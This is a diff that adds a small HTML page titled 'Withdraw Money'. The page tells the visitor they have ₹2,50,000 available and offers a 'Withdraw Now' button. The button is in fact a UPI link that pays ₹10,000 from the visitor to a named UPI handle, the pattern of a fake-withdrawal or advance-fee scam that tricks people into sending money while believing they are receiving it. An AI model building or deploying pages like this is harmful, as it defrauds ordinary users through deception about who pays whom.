@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Withdraw Money</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+      background-color: #f4f4f4;
+    }
+
+    .withdraw-box {
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+      display: inline-block;
+    }
+
+    .amount {
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #333;
+    }
+
+    .btn {
+      background-color: #28a745;
+      color: white;
+      padding: 15px 30px;
+      font-size: 18px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    .btn:hover {
+      background-color: #218838;
+    }
+  </style>
+</head>
+<body>
+  <div class="withdraw-box">
+    <h1>Payment Section</h1>
+    <p class="amount">Aapka amount: <strong>₹2,50,000</strong></p>
+
+    <!-- Redirects to UPI payment link -->
+    <a href="upi://pay?pa=6005973034@ybl&pn=ramchoudhary&am=10000&cu=INR" class="btn">Withdraw Now</a>
+  </div>
+</body>
+</html>
